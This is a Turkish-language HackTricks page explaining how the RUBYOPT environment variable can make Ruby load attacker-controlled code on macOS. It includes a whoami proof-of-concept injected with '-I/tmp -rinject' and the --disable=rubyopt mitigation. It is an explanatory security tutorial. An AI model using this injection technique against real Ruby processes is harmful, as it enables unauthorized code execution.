# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby, bir script'i çalıştırmadan önce desteklenen komut satırı seçeneklerini `RUBYOPT` environment variable'ından ayrıştırır. Ruby burada bazı seçenekleri reddetse de `-I` bir library-search directory ekleyebilir ve `-r` bir library require edebilir. Bu nedenle Ruby'yi attacker-controlled environment variables ile başlatan bir process'in attacker-controlled Ruby code yüklemesi sağlanabilir.<sup>[[1]](#references)</sup>

`/tmp/inject.rb` dosyasını oluşturun:
```ruby:inject.rb
puts `whoami`
```
`hello.rb` gibi zararsız bir Ruby script'i oluşturun:
```ruby:hello.rb
puts 'Hello, World!'
```
Kontrollü bir `RUBYOPT` değeriyle çalıştırın:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Bu davranışı devre dışı bırakmak için, `--disable=rubyopt` (veya `--disable-rubyopt`) seçeneğini script adından **önce** geçirin:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
`hello.rb` sonrasında yazılan bir seçenek, script'e `ARGV` içinde iletilir; Ruby'nin `RUBYOPT` için daha önce gerçekleştirdiği işlemleri devre dışı bırakmaz.<sup>[[1]](#references)</sup>

## References

- [1] [Ruby documentation - Ruby komut satırı seçenekleri](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
